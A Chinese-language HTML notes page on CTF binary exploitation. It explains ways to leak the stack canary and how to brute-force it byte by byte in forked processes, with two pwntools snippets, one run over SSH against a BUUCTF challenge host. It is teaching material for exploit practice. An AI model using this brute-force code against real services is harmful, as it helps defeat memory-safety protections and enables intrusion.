<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title># canary 绕过-逐字节爆破,canary 绕过-逐字节爆破</title>
    <link rel="stylesheet" href="/assets/css/notes.min.css">
</head>
<body>
    <div class="main-content-wrapper">
        <main class="content">
            <h1>canary 绕过-逐字节爆破</h1>
<h2>1.基本的泄露 canary</h2>
<ul>
<li>利用栈溢出泄露 canary：因为 canary 是以‘\x00’结尾的，所以栈溢出覆盖 canary 的最低字节，那么之后刚好有一个输出函数的时候就会正好把 canary 连带着输出</li>
<li>利用格式化字符串泄露 canary：由于 canary 存储在栈上，所以可以利用格式化字符串漏洞进行进行泄露</li>
</ul>
<h2>2.逐字节爆破</h2>
<ul>
<li>前提：canary 不变的情况下，并且使用拷贝函数时结尾不会附带<code>\0</code></li>
<li>场景：同一个进程中的不同线程的 canary 是相同的父进程创建（fork）的子进程与父进程 canary 相同，所以可以通过子进程是否打印报错信息来逐字节爆破 canaary</li>
<li>如果直接采取整个 canary 进行爆破，时间复杂度是根据操作系统位数呈现指数级爆炸的，但是如果每次只爆破一位，那么时间复杂度显著减少，因为每一字节只有 0-256 的可能性，而计算总次数则是每一位计算时间的相加</li>
</ul>
<pre><code class="language-python">print(&quot;[+] Brute forcing stack canary &quot;)
canary = b&quot;\x00&quot;
while len(canary) &lt; 8:
    for i in range(0x100):
        p.sendafter(b&quot;&quot;, padding + canary + p8(i))        
        if not p.recvline_contains(b&quot;stack smashing detected&quot;, timeout=1):
            canary += p8(i)
            break

canary = u64(canary)
info(&quot;canary: &quot; + hex(canary))
</code></pre>
<pre><code class="language-python">session = ssh(host='node5.buuoj.cn', port=26482, user='CTFMan', password='guest')
print(&quot;[+] Brute forcing stack canary &quot;)
canary = b&quot;&quot;
while len(canary) &lt; 4:
    for i in range(0x100):
        # p = process([elf_path])
        p = session.process(['./vuln'])
        sla(b&quot;&gt; &quot;, str(100).encode())
        p.sendafter(b&quot;Input&gt; &quot;, 0x20*b'a' + canary + p8(i))

        if b&quot;stack smashing detected&quot; in p.recvline():
            p.close()
        else:
            canary += p8(i)
            print(&quot;[+] Successful Brute %d&quot;, i)
            p.close()
            break

canary = u32(canary)
info(&quot;canary: &quot; + hex(canary))
</code></pre>

        </main>
    </div>
</body>
</html>